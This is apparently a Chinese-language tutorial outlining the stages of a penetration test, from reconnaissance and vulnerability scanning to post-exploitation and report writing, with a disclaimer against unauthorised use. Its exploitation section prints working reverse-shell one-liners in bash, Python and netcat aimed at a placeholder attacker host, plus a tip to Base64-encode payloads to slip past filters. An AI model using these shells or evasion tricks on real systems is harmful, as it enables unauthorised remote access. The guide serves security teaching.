🛡️ 渗透测试流程详解

前言

渗透测试是一项系统性工作，需要遵循科学的方法论。本文分享我在学习过程中总结的渗透测试完整流程，适合入门参考。

⚠️ 声明：本文仅供学习交流，请勿用于未授权的系统测试。

📋 渗透测试完整流程

一个完整的渗透测试通常包含以下几个阶段：

  • 信息收集 - 收集目标资产、架构、人员等信息
  • 威胁建模 - 分析攻击面，确定测试重点
  • 漏洞分析 - 识别潜在安全问题
  • 漏洞利用 - 尝试利用漏洞获取权限
  • 后渗透 - 扩大战果，横向移动
  • 报告编写 - 整理发现，输出报告

🔍 1. 信息收集（Reconnaissance）

信息收集是渗透测试的核心阶段，所谓"渗透的本质是信息收集"。

1.1 被动信息收集

  • Whois 查询 - 获取域名注册信息、注册商、注册人
  • DNS 收集 - A记录、CNAME、MX、TXT等
  • 子域名枚举 - 爆破、字典、证书透明度
  • 空间测绘引擎 - FOFA、Shodan、Quake、ZoomEye
  • 搜索引擎 - Google Hacking、Bing

1.2 主动信息收集

  • 端口扫描 - Nmap 识别开放端口
  • 服务识别 - 识别服务版本、中间件
  • Web 指纹识别 - CMS、中间件、框架
  • 目录扫描 - Dirsearch、gobuster

常用工具命令

# 子域名枚举
subfinder -d target.com

# 端口扫描
nmap -sV -p- -T4 target.com

# 目录扫描
python -m dirsearch -u https://target.com

# Web 指纹
whatweb target.com

🎯 2. 漏洞扫描（Vulnerability Scanning）

基于收集到的信息，进行漏洞探测。

2.1 漏洞扫描工具

  • Nuclei - 高效的 POC 扫描工具，支持自定义模板
  • Nessus - 商业漏洞扫描器
  • OpenVAS - 开源漏洞扫描器
  • AWVS - Web 应用漏洞扫描

2.2 常见 Web 漏洞

  • SQL 注入 - 数据库泄露、getshell
  • XSS 跨站脚本 - 窃取 Cookie、会话劫持
  • CSRF - 跨站请求伪造
  • 文件上传 - Webshell 上传
  • 命令执行 - RCE、反弹 Shell
  • SSRF - 服务端请求伪造
  • 越权访问 - 垂直/水平越权

Nuclei 常用命令

# 使用 CVEs 模板
nuclei -u https://target.com -t cves/

# 使用常见漏洞模板
nuclei -u https://target.com -t vulnerabilities/

# 批量扫描
nuclei -l targets.txt -o results.txt

💥 3. 漏洞利用（Exploitation）

验证漏洞真实存在，并尝试获取初始访问权限。

3.1 获取 Shell 的方法

  • Webshell - 文件上传后获取
  • 反弹 Shell - 命令执行时反弹
  • MSF - Metasploit 框架

3.2 常用反弹 Shell

# Bash
bash -i >& /dev/tcp/attacker/port 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(["/bin/sh","-i"])'

# Netcat
nc -e /bin/sh attacker port
💡 技巧：实际测试中注意使用 Base64 编码等方式绕过过滤。

🔄 4. 后渗透（Post-Exploitation）

获取初始权限后，继续扩大战果。

4.1 权限提升

  • 本地提权 - 从普通用户到管理员/System
  • 内核漏洞 - 利用系统内核漏洞
  • SUDO 提权 - 利用配置错误的 sudo 权限
  • SUID 提权 - 查找可利用的 SUID 文件

4.2 横向移动

  • Pass the Hash - NTLM 哈希传递
  • 凭据窃取 - 内存中提取明文密码
  • 内网探测 - 发现更多内网资产
  • 端口转发 - 建立隧道访问内网

4.3 权限维持

  • 后门 - 植入隐蔽后门
  • 计划任务 - 定时执行脚本
  • 开机启动 - 持久化访问

📝 5. 报告编写

渗透测试的最终交付物是专业的测试报告。

报告结构

  • 测试概要 - 测试范围、时间、结论
  • 信息收集 - 收集到的资产清单
  • 漏洞详情 - 每个漏洞的描述、危害、复现步骤
  • 修复建议 - 针对每个漏洞的修复方案
  • 测试截图 - 漏洞证明（PoC）截图
💡 建议：报告要清晰、图文并茂，让客户能看懂并按建议修复。

💡 总结

渗透测试需要系统性的方法和持续的学习。重点是：

  • 信息收集 - 花足够时间在侦察阶段
  • 工具熟练度 - 熟悉常用工具的使用
  • 漏洞原理 - 理解漏洞产生的根本原因
  • 动手实践 - DVWA、HackTheBox、VulnHub
